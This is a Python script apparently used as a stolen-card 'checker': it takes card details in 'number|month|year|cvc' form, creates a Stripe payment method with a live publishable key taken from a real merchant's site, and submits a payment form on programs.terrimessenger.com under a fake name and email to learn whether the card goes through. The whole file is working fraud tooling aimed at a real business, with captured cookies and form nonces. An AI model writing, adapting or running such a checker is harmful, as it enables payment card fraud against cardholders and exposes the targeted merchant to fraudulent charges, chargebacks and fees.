import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fe9b153e2b2%3B+stripe-js-v3%2Fe9b153e2b2%3B+card-element&key=pk_live_51EI4EyBFY0oVi16o4VeM3Nks9mYV0MShbrlTZSyKiwoEAW1FNgyYvBlM2yAR8ZrgmRQ4cCX72EnTiRA1XaEAZyRk00Mniosd2o'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'ac_enable_tracking': '1',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_first_add': 'fd%3D2025-04-19%2014%3A06%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fprograms.terrimessenger.com%2Flanding-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
	    '_ga': 'GA1.1.628920376.1745071597',
	    '_fbp': 'fb.1.1745071597541.674228862251050526',
	    '__stripe_mid': '18c6c49a-748c-4575-8a92-bf41b920a32f45b649',
	    '__stripe_sid': '5ca6d0b2-b609-44d7-acb5-c54ee1f9739009e58f',
	    'sbjs_current_add': 'fd%3D2025-04-19%2014%3A09%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Fprograms.terrimessenger.com%2Flanding-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fprograms.terrimessenger.com%2Flanding-page%2F',
	    '_ga_7MEN03JW28': 'GS1.1.1745071596.1.1.1745071765.0.0.0',
	    '_ga_HRP6YFJ294': 'GS1.1.1745071596.1.1.1745071765.0.0.0',
	}
	
	headers = {
	    'authority': 'programs.terrimessenger.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'ac_enable_tracking=1; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2025-04-19%2014%3A06%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fprograms.terrimessenger.com%2Flanding-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.628920376.1745071597; _fbp=fb.1.1745071597541.674228862251050526; __stripe_mid=18c6c49a-748c-4575-8a92-bf41b920a32f45b649; __stripe_sid=5ca6d0b2-b609-44d7-acb5-c54ee1f9739009e58f; sbjs_current_add=fd%3D2025-04-19%2014%3A09%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Fprograms.terrimessenger.com%2Flanding-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fprograms.terrimessenger.com%2Flanding-page%2F; _ga_7MEN03JW28=GS1.1.1745071596.1.1.1745071765.0.0.0; _ga_HRP6YFJ294=GS1.1.1745071596.1.1.1745071765.0.0.0',
	    'origin': 'https://programs.terrimessenger.com',
	    'referer': 'https://programs.terrimessenger.com/landing-page/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1745071781820',
	}
	
	data = {
	    '_tutor_nonce': 'ea5093d367',
	    'data': 'ak_hp_textarea=&ak_js=1745071739709&__fluent_form_embded_post_id=9973&_fluentform_3_fluentformnonce=ad2dc69e78&_wp_http_referer=%2Flanding-page%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&payment_input_1=2&payment_method=stripe&ak_bib=1745071745413&ak_bfs=1745071781035&ak_bkpc=7&ak_bkp=19%3B5%3B8%3B6%3B5%3B10%3B7%3B&ak_bmc=26%3B21%2C1659%3B20%2C1788%3B8%2C2048%3B10%2C1633%3B7%2C1699%3B16%2C1601%3B16%2C1441%3B23%2C7636%3B14%2C2183%3B22%2C14588%3B&ak_bmcc=11&ak_bmk=&ak_bck=&ak_bmmc=3&ak_btmc=4&ak_bsc=20&ak_bte=101%3B314%2C265%3B205%2C193%3B258%2C-205%3B48%2C299%3B100%2C1981%3B98%2C1597%3B81%2C1715%3B76%2C1988%3B97%2C1567%3B62%2C1618%3B78%2C1535%3B78%2C1386%3B415%2C6960%3B64%2C182%3B286%2C1630%3B30%2C232%3B317%2C500%3B59%2C13748%3B&ak_btec=19&ak_bmm=5%2C227%3B1%2C231%3B1%2C284%3B&terms-n-condition=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post(
	    'https://programs.terrimessenger.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
